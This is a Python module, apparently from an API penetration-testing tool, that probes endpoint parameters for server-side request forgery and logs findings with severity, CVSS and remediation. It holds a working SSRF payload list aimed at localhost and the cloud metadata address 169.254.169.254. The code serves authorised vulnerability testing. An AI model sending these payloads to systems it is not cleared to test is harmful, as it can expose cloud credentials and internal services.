"""
SSRF Tester.
Tests endpoints for Server-Side Request Forgery vulnerabilities.
"""

import logging
import requests
from typing import List, Dict, Any
from ..finding_manager import FindingManager, Finding, Evidence
from ..enumeration.swagger_parser import ApiEndpoint
from ..enumeration.parameter_analyzer import ParameterAnalyzer

logger = logging.getLogger(__name__)


class SsrfTester:
    """Tests API endpoints for SSRF vulnerabilities."""

    def __init__(
        self,
        finding_manager: FindingManager,
        target_url: str,
        auth_headers: Dict[str, str],
    ):
        self.finding_manager = finding_manager
        self.target_url = target_url
        self.auth_headers = auth_headers
        self.session = requests.Session()
        self.session.headers.update(auth_headers)

        # SSRF Payloads targeting local services and cloud metadata
        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",  # AWS/GCP Metadata
        ]

    def test_endpoints(self, endpoints: List[ApiEndpoint]) -> None:
        """Runs SSRF tests against candidates."""
        logger.info("Starting SSRF tests...")

        for endpoint in endpoints:
            candidates = [
                p
                for p in endpoint.parameters
                if p.name.lower() in ParameterAnalyzer.SSRF_CANDIDATES
            ]
            for param in candidates:
                self._test_ssrf(endpoint, param)

        logger.info("SSRF testing complete.")

    def _test_ssrf(self, endpoint: ApiEndpoint, param) -> None:
        """Tests for SSRF on a specific parameter."""
        url = f"{self.target_url}{endpoint.path}"

        for payload in self.payloads:
            req_url = url
            params = {}
            json_data = None

            if param.in_location == "path":
                req_url = req_url.replace(f"{{{param.name}}}", payload)
            elif param.in_location == "query":
                params[param.name] = payload
            elif param.in_location == "body":
                json_data = {param.name: payload}

            try:
                response = self.session.request(
                    method=endpoint.method,
                    url=req_url,
                    params=params,
                    json=json_data,
                    timeout=5,
                    allow_redirects=False,
                )

                body = response.text.lower()
                # Indicators of successful SSRF (e.g., cloud metadata access or local service response)
                if (
                    "ami-id" in body
                    or "instance-id" in body
                    or "nginx" in body
                    or "apache" in body
                ):
                    evidence = Evidence(
                        type="request_response",
                        content=f"Payload: {payload}\nStatus: {response.status_code}\nSnippet:\n{response.text[:300]}",
                        description="Internal service or cloud metadata responded to SSRF payload.",
                    )

                    finding = Finding(
                        title=f"Server-Side Request Forgery (SSRF) on {param.name}",
                        description=f"The endpoint {endpoint.method} {endpoint.path} appears vulnerable to SSRF via the '{param.name}' parameter. The server successfully requested and returned data from an internal or cloud metadata service.",
                        vulnerability_type="Server-Side Request Forgery",
                        severity="CRITICAL",
                        cwe_id="CWE-918",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
                        component=f"{endpoint.path} [{param.name}]",
                        remediation="Validate URLs strictly against an allowlist of permitted domains/IPs. Do not allow requests to internal IP ranges (e.g., 127.0.0.0/8, 10.0.0.0/8, 169.254.169.254).",
                        evidence=[evidence],
                    )
                    self.finding_manager.add_finding(finding)
                    return
            except Exception as e:
                logger.debug(f"SSRF test failed for {param.name}: {e}")
